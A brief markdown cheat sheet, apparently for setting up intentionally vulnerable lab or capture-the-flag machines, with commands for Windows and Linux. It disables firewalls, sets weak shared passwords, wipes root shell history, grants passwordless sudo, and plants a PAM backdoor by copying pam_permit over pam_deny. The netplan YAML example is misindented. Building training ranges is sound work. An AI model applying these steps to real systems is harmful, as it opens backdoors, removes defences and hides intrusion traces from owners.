---
title: "Common Box Creation Resources"
---

# Common Box Creation Resources

Windows reset firewalls:
```text
netsh advfirewall reset
netsh advfirewall set allprofiles state off
```

Windows reset admin:
```text
net user Administrator /active:yes
net user Administrator Password1!
```

Windows → ENABLE SMB!

Linux clear history: (we are purposely not removing apt logs and such)
```text
rm -f /root/.viminfo
rm -f /root/.bash_history
rm -f /root/.zsh_history
```

Linux add users:
```text
for user in $(cat users.txt); do useradd -m -s /bin/bash $user; echo "$user:Password1!" | chpasswd; done
```

Linux set static IP for before Ubuntu 22:
```text
/etc/network/interfaces
auto eth0
iface eth0 inet static
address 192.168.0.11
netmask 255.255.255.0
network 192.168.0.1
broadcast 192.168.0.255
gateway 192.168.0.1
```

Linux set static IP for Ubuntu 22 and later:
```text
/etc/netplan/00-ethernet.yaml

network:
  version: 2
  renderer: networkd
  ethernets:
    <interface name>:
      dhcp4: false
      dhcp6: false
     addresses:
      - 192.168.0.10/24
     routes:
      - to: default
        via: 192.168.0.1
     nameservers:
       addresses: [192.168.0.1]

Apply changes:
sudo netplan apply
```

Linux find and replace recursively

```text
find . -name '*.txt*' -exec sed -i 's/user1/user2/g' {} +
```

Sudoer NOPASSWD

```text
%sudo   ALL=(ALL:ALL) NOPASSWD:ALL
```


Classic PAM backdoor

```text
# Ubuntu 20.04
cd /usr/lib/x86_64-linux-gnu/security/; mv pam_deny.so pam_deny_original.so; cp pam_permit.so pam_deny.so
```
